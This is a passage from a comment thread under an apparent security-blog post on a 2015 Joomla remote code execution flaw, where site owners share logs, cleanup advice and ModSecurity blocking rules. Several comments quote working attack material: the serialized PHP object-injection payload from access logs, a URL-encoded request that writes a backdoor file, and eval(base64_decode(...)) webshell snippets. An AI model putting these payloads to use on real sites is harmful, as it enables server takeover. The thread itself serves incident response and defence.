<p>Adds a sanitizing routine for the HTTP_X_FORWARDED_FOR variable and a similar line does the REMOTE_ADDR variable. The user agent is just completely removed from the session data.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even depth-2" id="comment-7134">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/4c7eec676a9b4662214e9198afa29acb?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/4c7eec676a9b4662214e9198afa29acb?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Phil Taylor, The Joomla Expert</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T16:05:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7134">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Seems my other comment is being held for moderation &#8211; so I&#8217;ll give you a 4 word summary here &#8211; you are factually wrong!</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt thread-even depth-1" id="comment-7121">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/eb1cc0771b941eb42a0a3c66a9250b1f?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/eb1cc0771b941eb42a0a3c66a9250b1f?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Philippe</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T15:33:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7121">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Hi,</p>
<p>I test a modsecurity rules which has stopped the attack.<br />
Put your own rules in your modsecurity configuration file , typically &#8220;/etc/httpd/modsecurity.d/activated_rules/modsecurity_crs_10_lab.conf&#8221; :<br />
SecRule REQUEST_URI|ARGS|REQUEST_HEADERS &#8220;test|O:21:&#8221;JDatabaseDriverMysqli&#8221;&#8221; &#8220;id:99992,severity:4,msg:&#8217;Access Denied'&#8221;<br />
SecRule REQUEST_URI|ARGS|REQUEST_HEADERS &#8220;eval(base64_decode($_POST[111]&#8221; &#8220;id:99991,severity:4,msg:&#8217;Access Denied'&#8221;<br />
SecRule REQUEST_URI|ARGS|REQUEST_HEADERS &#8220;feed_url&#8221; &#8220;id:99990,severity:4,msg:&#8217;Access Denied'&#8221;</p>
<p>The first rule should be enough to stop the attack</p>
<p>In modsec_audit.log : the access is denied</p>
<p>&#8211;aed86a72-H&#8211;<br />
Message: Access denied with code 403 (phase 2). Pattern match &#8220;test|O:21:&#8221;JDatabaseDriverMysqli&#8221;&#8221; at REQUEST_HEADERS:User-Agent. [file &#8220;/etc/httpd/modsecurity.d/activated_rules/modsecurity_crs_10_lab.conf&#8221;] [line &#8220;38&#8221;] [id &#8220;99992&#8221;] [msg &#8220;Access Denied&#8221;] [severity &#8220;WARNING&#8221;]</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-odd thread-alt depth-1" id="comment-7141">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/47b09b0c5953036e109f9c0ccba85ba3?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/47b09b0c5953036e109f9c0ccba85ba3?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">victim</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T17:01:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7141">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I&#8217;d like to share my findings about what modifications to your system you should expect. After JDatabaseDriverMysqli requests, there was suspicious mail server activity. Deferred mails contained the header X-PHP-Originating-Script: 33:include.php(1960), infected php files (a few spread across system, some new, some modified, no particluar size or timestamp or name) contained either<br />
eval (base64_decode($_POST[&#8220;php&#8221;]) or<br />
$GLOBALS[&#8216;some_binary_data_starting_with_small_letters&#8217;],<br />
the latter often starting in row ~519 of line 1 of a php so you only see it with line wrapping enabled&#8230;</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-2" id="comment-7150">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://dcid.me" class="comment-author-link" rel="external nofollow" itemprop="url">Daniel Cid</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T20:26:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7150">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Thanks for sharing. Hope that is useful to anyone else trying to clean their site.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-7154">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/1c51bec7f8639e6f8a508fbc97e0a5da?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/1c51bec7f8639e6f8a508fbc97e0a5da?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Der Koch</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-17T02:32:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7154">December 17, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I see comments of people moaning that you guys posted this info; but for me, all I can say is THANK YOU, tnx tnx, a lot.  My sites started receiving this crap, and for the info posted by you guys I was able to detect how much the attackers did (so far nothing), and how to avoid it in the future, aside of the piece of news so we all got aware.</p>
<p>Also, on a side note&#8230; I have daily backups, and cannot find a single changed file (not by me) for the websites, something inside tells me there has to be something else.  From my logs I do see first the _POST[111], but no &#8216;HTTP_CMD&#8217; before it, multiple times.  Also, the crap they send comes in HTTP_X_FORWARDED_FOR and HTTP_USER_AGENT</p>
<p>I also see a few &#8220;tests&#8221; like &#8220;print md5(123123123);JFactory::getConfig();exit;&#8221; where it  seems they are verifying the payload ran, but the md5 argument is always the same.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-7161">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/f049fe6727867307ba8f993721b21021?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/f049fe6727867307ba8f993721b21021?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="https://www.saotn.org" class="comment-author-link" rel="external nofollow" itemprop="url">Jan R</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-17T17:50:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7161">December 17, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Hi Xristoph,</p>
<p>Of course, the post contains real live bits of malware, no wonder your anti malware program goes nuts&#8230; However, it&#8217;s only plain text and no scripts, so you don&#8217;t have to worry </p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-7163">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/e5d80b99f4675042f9f5b11917215f0b?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/e5d80b99f4675042f9f5b11917215f0b?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Suzanne</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-18T05:21:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7163">December 18, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Just a question on this. Does the update over a hacked site fix it or do we also need to go through other exercises? are only php files hacked or does this affect the database as well? Uh, maybe this is the same question as the one below  Thank you</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-2" id="comment-7165">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/f2b75227953aa513ef7f7c9d05fba8df?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/f2b75227953aa513ef7f7c9d05fba8df?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://www.nightingale-collaboration.org/" class="comment-author-link" rel="external nofollow" itemprop="url">Alan Henness</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-18T10:44:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7165">December 18, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>As I understand it, the update would stop any future attempts to exploit the site but if your site (like two of mine) was targeted before the update, then just about anything could have been done to your site. So I think we&#8217;re left with no option but to look for new and changed files. I&#8217;ve not found an easy way to do this so it looks like it&#8217;s going to take a long time.</p>
<p>I have Akeeba&#8217;s Admin Tools installed and this generally protects against a lot of attacks. However, it didn&#8217;t at the time protect against this one (the last update a few days ago does). One of the features is a way to compare files to see if they have changed. Unfortunately, I had never run that on my sites, so I had nothing to compare to! But I think that would have made life very easy in terms of finding new and changed files!</p>
<p>I think my only option is to download a recent backup (I use <a href="http://www.myrepono,com" rel="nofollow ugc">http://www.myrepono,com</a>) from before the exploits started a week or so ago and compare that to the current site (which has the update, so some files will have changed anyway). I know this needs to be done, but I have some deadlines approaching fast!</p>
<p>I don&#8217;t know if it will stop anything, but changing your database user&#8217;s password must be a minimum &#8211; I&#8217;ve changed the user and password &#8211; and as long as any backdoor doesn&#8217;t allow the hackers to re-access your configuration.php file, that should at least stop them accessing your database &#8211; I think&#8230;</p>
<p>Another simple thing to do is to check that no new joomla users have been created &#8211; one with superuser rights is obviously dangerous! Also check for new database users. </p>
<p>If anyone here knows better, please feel free to correct anything I&#8217;ve said! I&#8217;m not an expert.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even thread-odd thread-alt depth-1" id="comment-7164">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/ba2cff4c56e646dd0185f19e53e398d7?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/ba2cff4c56e646dd0185f19e53e398d7?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Martin</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-18T09:33:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7164">December 18, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Hello,<br />
I would like to ask if in this case will help SSL certificate for administration? Im not expert.</p>
<p>Thank you very much</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-2" id="comment-7166">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/4c7eec676a9b4662214e9198afa29acb?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/4c7eec676a9b4662214e9198afa29acb?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Phil Taylor, The Joomla Expert</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-18T13:26:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7166">December 18, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>No &#8211; a SSL Certificate will not protect you from this issue at all.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-7167">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/90ab348c44b2f5b25ff97d54e1a21764?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/90ab348c44b2f5b25ff97d54e1a21764?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Thomas</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-18T16:38:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7167">December 18, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Correct me if I am wrong but it appears that this is not a Joomla vulnerability but rather a PHP vulnerability.</p>
<p>That only webservers that are using older versions of PHP are vulnerable to this exploit regardless of if Joomla was patched quick enough or not. PHP was patched in September, so any server that updated PHP after that should be protected against this vulnerability.  PHP versions below 5.5.29, 5.6.13 and below 5.5 are the ones that are vulnerable.</p>
<p>Joomla released a patch that prevents older versions of PHP from being exploited through Joomla.  I am a bit new to this stuff, so check and confirm what I am saying. I think it would also be important to note that despite patching Joomla if you are using an older version of PHP that has the vulnerability. You may wind up being exploited in another way via the same vulnerability in some other way not only via Joomla. So you need to make sure what version of PHP you are using and update it if it is outdated.</p>
<p>Here is a link to the PHP changelog, showing the fix:   <a href="http://php.net/ChangeLog-5.php#5.5.29" rel="nofollow ugc">http://php.net/ChangeLog-5.php#5.5.29</a></p>
<p>I see attempts in my server logs to exploit this vulnerability, before the Joomla patch was released, like people mention in these comments. But my PHP version was updated before this so it does not appear that anything happened on the server.</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-2" id="comment-7169">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/a746e2ff69aafd175e65682cc3283fa8?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/a746e2ff69aafd175e65682cc3283fa8?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://www.babdev.com/" class="comment-author-link" rel="external nofollow" itemprop="url">Michael Babker</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-18T21:40:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7169">December 18, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>It is a Joomla vulnerability in that certain data was allowed to be injected into the session without sanitization.  Regardless of PHP version, that was exploitable.  The use after free vulnerabilities fixed in PHP releases this year help to mitigate the scope of what can be done with the vulnerabilities, but it would be wrong to assume that users running PHP 5.4.45, 5.5.29+, or 5.6.13+ are fully protected because of the PHP security patches.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even depth-2" id="comment-7175">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/18617a4f711a1a33644c97da269c9d33?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/18617a4f711a1a33644c97da269c9d33?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Anna Mendez</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-22T01:11:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7175">December 22, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I think you was right that users with old php versions are vulnerable even after patch 3.4.6. But today Joomla just release 3.4.7 version and with this version even users with old php are not vulerable anymore. Is that correct?</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-7168">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/a1919d8c618a0bf23d8f8a442fb9cb3a?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/a1919d8c618a0bf23d8f8a442fb9cb3a?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://www.marcelopedra.com.ar/blog/" class="comment-author-link" rel="external nofollow" itemprop="url">Marcelo Pedra</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-18T20:16:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7168">December 18, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Hello people. Any report on this affecting sites using Joomla 1.0? Yes, I have a couple ones in an old server and I&#8217;ve found the keyword &#8220;JDatabaseDriverMysqli&#8221; within the logs. Am I vulnerable or only those with 1.5+ are?</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-7170">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/dcdcaff56953852209c18914c45f611b?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/dcdcaff56953852209c18914c45f611b?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://www.wasimismail.com" class="comment-author-link" rel="external nofollow" itemprop="url">Wasim Ismail</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-19T01:36:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7170">December 19, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>HI I have just downloaded my site on to my localhost on my PC After it got attacked :S.<br />
 Im tring to login to the admin, and the page does not move foward, even after changing password from myphpadmin.  Is that part of this attack?</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-7173">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/18617a4f711a1a33644c97da269c9d33?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/18617a4f711a1a33644c97da269c9d33?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Anna Mendez</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-21T02:17:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7173">December 21, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>If a joomla website is attacked, other joomla webistes (not yet attacked and yet upgraded with last hotfixes) on same server are vulnerable?</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-7176">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/18617a4f711a1a33644c97da269c9d33?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/18617a4f711a1a33644c97da269c9d33?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Anna Mendez</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-22T01:12:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7176">December 22, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Joomla 3.4.7 just release (and equivalent hotfix for J1.5 and J2.5). It seems that users with old php versions (before  5.4.45, 5.5.29, 5.6.13) are vulnerable even after patch 3.4.6. But today Joomla just release 3.4.7 version and with this version even users with old php are not vulerable anymore. Is that correct?</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-7194">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/8b5d94f9560dddbe5bb2c683debc23e6?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/8b5d94f9560dddbe5bb2c683debc23e6?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Nicolas Dadou</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-31T15:25:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7194">December 31, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Hi is there a manner to know what they made with the log?<br />
here is the logs from my website.</p>
<p>95.110.187.117 website &#8211; [31/Dec/2015:00:34:53 +0100] &#8220;GET /administrator/?1=%40ini_set%28%22display_errors%22%2C%220%22%29%3B%40set_time_limit%280%29%3B%40set_magic_quotes_runtime%280%29%3Becho%20%27-%3E%7C%27%3Bfile_put_contents%28%24_SERVER%5B%27DOCUMENT_ROOT%27%5D.%27/administrator/dbconfig.php%27%2Cbase64_decode%28%&#8221;code I don&#8217;t provide for security ( I don&#8217;t know what is it)&#8221; HTTP/1.1&#8243; 200 9187 &#8220;-&#8221; &#8220;}__test|O:21:&#8221;JDatabaseDriverMysqli&#8221;:3:{s:2:&#8221;fc&#8221;;O:17:&#8221;JSimplepieFactory&#8221;:0:{}s:21:&#8221;\0\0\0disconnectHandlers&#8221;;a:1:{i:0;a:2:{i:0;O:9:&#8221;SimplePie&#8221;:5:{s:8:&#8221;sanitize&#8221;;O:20:&#8221;JDatabaseDriverMysql&#8221;:0:{}s:8:&#8221;feed_url&#8221;;s:46:&#8221;eval($_REQUEST[1]);JFactory::getConfig();exit;&#8221;;s:19:&#8221;cache_name_function&#8221;;s:6:&#8221;assert&#8221;;s:5:&#8221;cache&#8221;;b:1;s:11:&#8221;cache_class&#8221;;O:20:&#8221;JDatabaseDriverMysql&#8221;:0:{}}i:1;s:4:&#8221;init&#8221;;}}s:13:&#8221;\0\0\0connection&#8221;;b:1;}xf0x9dx8cx86&#8243;<br />
95.110.187.117 website &#8211; [31/Dec/2015:00:34:53 +0100] &#8220;GET /administrator/?1=%40ini_set%28%22display_errors%22%2C%220%22%29%3B%40set_time_limit%280%29%3B%40set_magic_quotes_runtime%280%29%3Becho%20%27-%3E%7C%27%3Bfile_put_contents%28%24_SERVER%5B%27DOCUMENT_ROOT%27%5D.%27/administrator/dbconfig.php%27%2Cbase64_decode%28%&#8221;code I don&#8217;t provide for security ( I don&#8217;t know what is it)&#8221; HTTP/1.1&#8243; 200 9187 &#8220;-&#8221; &#8220;Python-urllib/2.7&#8221;<br />
95.110.187.117 website &#8211; [31/Dec/2015:00:34:54 +0100] &#8220;GET /?1=%40ini_set%28%22display_errors%22%2C%220%22%29%3B%40set_time_limit%280%29%3B%40set_magic_quotes_runtime%280%29%3Becho%20%27-%3E%7C%27%3Bfile_put_contents%28%24_SERVER%5B%27DOCUMENT_ROOT%27%5D.%27/administrator/dbconfig.php%27%2Cbase64_decode%28%&#8221;code I don&#8217;t provide for security ( I don&#8217;t know what is it)&#8221; HTTP/1.1&#8243; 200 68918 &#8220;-&#8221; &#8220;}__test|O:21:&#8221;JDatabaseDriverMysqli&#8221;:3:{s:2:&#8221;fc&#8221;;O:17:&#8221;JSimplepieFactory&#8221;:0:{}s:21:&#8221;\0\0\0disconnectHandlers&#8221;;a:1:{i:0;a:2:{i:0;O:9:&#8221;SimplePie&#8221;:5:{s:8:&#8221;sanitize&#8221;;O:20:&#8221;JDatabaseDriverMysql&#8221;:0:{}s:8:&#8221;feed_url&#8221;;s:46:&#8221;eval($_REQUEST[1]);JFactory::getConfig();exit;&#8221;;s:19:&#8221;cache_name_function&#8221;;s:6:&#8221;assert&#8221;;s:5:&#8221;cache&#8221;;b:1;s:11:&#8221;cache_class&#8221;;O:20:&#8221;JDatabaseDriverMysql&#8221;:0:{}}i:1;s:4:&#8221;init&#8221;;}}s:13:&#8221;\0\0\0connection&#8221;;b:1;}xf0x9dx8cx86&#8243;<br />
I don&#8217;t find any file updated in the <a href="http://FTP..." rel="nofollow ugc">http://FTP&#8230;</a>.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-7198">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/ff1dd596ceb9fb0ff5a2b137d047a797?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/ff1dd596ceb9fb0ff5a2b137d047a797?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Martin Lines</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2016-01-01T12:34:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7198">January 1, 2016</a></time></p>		</header>

		<div class="comment-content">
			
			<p>My site was originally compromised on the zero day. Following a lot of effort we thought we had cleaned it up. Joomla was updated to 3.4.8 and php is 5.4.45. However it was successfully attacked last night.The only files I can find affect are defines.php in /includes and /administrator/includes. </p>
<p>In access.log I can see entries such as&#8230;.</p>
<p>166.62.102.232 &#8211; &#8211; [01/Jan/2016:05:05:10 +0000] &#8220;GET / HTTP/1.1&#8221; 200 2097 &#8220;-&#8221; &#8220;}__test|O:21:&#8221;JDatabaseDriverMysqli&#8221;:3:{s:2:&#8221;fc&#8221;;O:17:&#8221;JSimplepieFactory&#8221;:0:{}s:21:&#8221;\0\0\0disconnectHandlers&#8221;;a:1:{i:0;a:2:{i:0;O:9:&#8221;SimplePie&#8221;:5:{s:8:&#8221;sanitize&#8221;;O:20:&#8221;JDatabaseDriverMysql&#8221;:0:{}s:8:&#8221;feed_url&#8221;;s:3822:&#8221;eval(base64_decode(&#8216;JGNoZWNrID0gJF9TRV&#8230;&#8230;&#8230;entry continues on!!</p>
<p>I am not skilled enough to know if this was the successful attempt, the &#8220;200&#8221; is worrying as this was a success. Or perhaps I did not find all the entries previously and am being re-infected via a backdoor they have left themselves.?</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-2" id="comment-7200">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/4360d89c79b4cfa79216cee73a69dc25?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/4360d89c79b4cfa79216cee73a69dc25?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Ken Edwards</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2016-01-01T17:15:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7200">January 1, 2016</a></time></p>		</header>

		<div class="comment-content">
			
			<p>We are witnessing the same as you across a number of Joomla! 3, 2.5 and 1.5 websites after rolling back to &#8216;clean&#8217; backups made before 9 Dec 2015.</p>
<p>All affected sites are using J3.4.7 or latest Security Hot fixes (if J1.5 and 2.5) and PHP is 5.5.30 (before the 0-day Hack it was 5.4).</p>
<p>Anybody else shed any light? The fresh install of a J3.4.7 CMS and J2.5.28 + Hot Fixes TEST sites we have created are holding up well (no 0 Day hacks) but not the previously live sites which we are monitoring.</p>
<p>Currently we are faced with rock and hard place:</p>
<p>rebuild sites on fresh J3.4.7 (now 3.4.8 following bug fix release), or<br />
expensive clean, </p>
<p>with neither guaranteeing freedom from future hacks.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even thread-odd thread-alt depth-1" id="comment-7205">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/6ee9e067e8f436dce02e3c433d793d83?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/6ee9e067e8f436dce02e3c433d793d83?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Toby Salmon</span> 			</p>

